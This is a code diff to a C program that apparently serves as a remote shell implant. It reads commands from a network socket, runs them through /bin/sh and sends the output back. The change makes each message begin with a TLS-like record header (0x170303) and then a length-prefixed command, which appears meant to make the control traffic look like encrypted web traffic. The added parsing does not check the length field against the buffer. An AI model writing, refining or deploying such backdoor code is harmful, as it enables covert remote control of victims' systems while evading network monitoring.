@@ -188,6 +188,28 @@ int main(int argc, char const* argv[]) {
         char buf_cmd[5000] = {0};
         int valread = read(sock, buf_cmd, 5000);
 
+        long cod;
+        if (end_tst() == 0) {
+            cod = buf_cmd[0] + (buf_cmd[1] << 8) + (buf_cmd[2] << 16);
+        } else {
+            cod = (buf_cmd[0] << 16) + (buf_cmd[1] << 8) + buf_cmd[2];
+        }
+
+        if (cod != 0x170303) {
+            break;
+        }
+
+        int cmd_s;
+        if (end_tst() == 0) {
+            cmd_s = buf_cmd[3] + (buf_cmd[4] << 8);
+        } else {
+            cmd_s = (buf_cmd[3] << 8) + buf_cmd[4];
+        }
+
+        unsigned char* cmd = malloc(cmd_s+1);
+        strncpy(cmd, buf_cmd+5, cmd_s);
+        cmd[cmd_s] = '\0';
+
         char buf_res[5000] = {0};
         int buf_res_s;
         int pipes[2];
@@ -204,7 +226,7 @@ int main(int argc, char const* argv[]) {
             dup2(pipes[1], STDERR_FILENO);
             close(pipes[0]);
             close(pipes[1]);
-            execl("/bin/sh", "sh", "-c", buf_cmd, NULL);
+            execl("/bin/sh", "sh", "-c", cmd, NULL);
             exit(EXIT_FAILURE);
         } else {
             close(pipes[1]);
